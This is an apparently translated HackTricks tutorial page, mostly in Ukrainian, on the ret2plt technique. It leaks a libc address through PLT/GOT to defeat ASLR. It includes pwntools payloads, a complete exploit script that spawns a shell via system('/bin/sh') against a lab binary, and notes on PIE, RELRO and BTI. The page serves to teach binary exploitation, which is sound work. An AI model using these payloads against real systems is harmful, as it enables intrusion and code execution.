# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Метою цієї техніки буде **leak адресу з функції PLT**, щоб обійти ASLR. Це тому, що, наприклад, якщо ви leak адресу функції `puts` з libc, ви зможете **обчислити, де знаходиться базовий адрес `libc`** і обчислити офсети для доступу до інших функцій, таких як **`system`**.

Це можна зробити за допомогою `pwntools` payload, наприклад ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Зверніть увагу, як **`puts`** (використовуючи адресу з PLT) викликається з адресою `puts`, що розташована в GOT (Global Offset Table). Це тому, що до того часу, коли `puts` виведе GOT-запис для puts, цей **запис міститиме точну адресу `puts` в пам'яті**.

Також зауважте, як адреса `main` використовується в exploit, тому коли `puts` закінчить своє виконання, **binary викликає `main` знову замість виходу** (тому leaked address залишатиметься дійсною).

> [!CAUTION]
> Зверніть увагу, що для цього **binary не може бути скомпільований з PIE** або ви повинні **знайти leak, щоб обійти PIE**, щоб знати адреси PLT, GOT і main. В іншому випадку спочатку потрібно обійти PIE.

Ви можете знайти [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Це був фінальний exploit з того **прикладу**:

<details>
<summary>Повний приклад exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Сучасні особливості

- **`-fno-plt` builds** (поширено в сучасних дистрибутивах) замінюють `call foo@plt` на `call [foo@got]`. Якщо в бінарі немає `foo@plt` stub, ви все ще можете leak резольвну адресу через `puts(elf.got['foo'])` та потім **повернутися безпосередньо до запису в GOT** (`flat(padding, elf.got['foo'])`), щоб стрибнути в libc після завершення lazy binding.
- **Full RELRO / `-Wl,-z,now`**: GOT лише для читання, але ret2plt все ще працює для leak, оскільки ви лише читаєте слот GOT. Якщо символ ніколи не викликався, ваш перший ret2plt також здійснить lazy binding і потім виведе резольвну адресу слоту.
- **ASLR + PIE**: якщо PIE увімкнено, спочатку зробіть leak вказівника коду (наприклад, збережена адреса повернення, вказівник на функцію або `.plt` entry через інший format‑string/infoleak), щоб обчислити базу PIE, після чого побудуйте ret2plt ланцюжок з перерахованими PLT/GOT адресами.
- **Архітектури поза x86 з BTI/PAC (AArch64)**: PLT записи є дійсними BTI landing pads (`bti c`), тому при експлуатації бінарів з увімкненим BTI віддавайте перевагу стрибку в PLT stub (або в інший BTI‑анотований gadget), замість прямого стрибка в libc gadget без BTI — інакше CPU згенерує `BRK`/`PAC` помилки.
- **Хелпер для швидкого резолювання**: якщо цільова функція ще не резольвнута і потрібен leak в один крок, зчепіть PLT виклик двічі: спочатку `elf.plt['foo']` (щоб резольвнути), потім знову `elf.plt['foo']` з адресою GOT як аргумент, щоб вивести тепер заповнений слот.

## Інші приклади та References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, перший крок — заповнити overflow до байта 0x00 of the canary, щоб потім викликати puts і leak його. Маючи canary, створюється ROP gadget для виклику puts, щоб leak адресу puts з GOT, а потім ROP gadget для виклику `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow в main з дочірньої функції. ROP gadget для виклику puts, щоб leak адресу puts з GOT, а потім виклик one gadget.

## Посилання

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
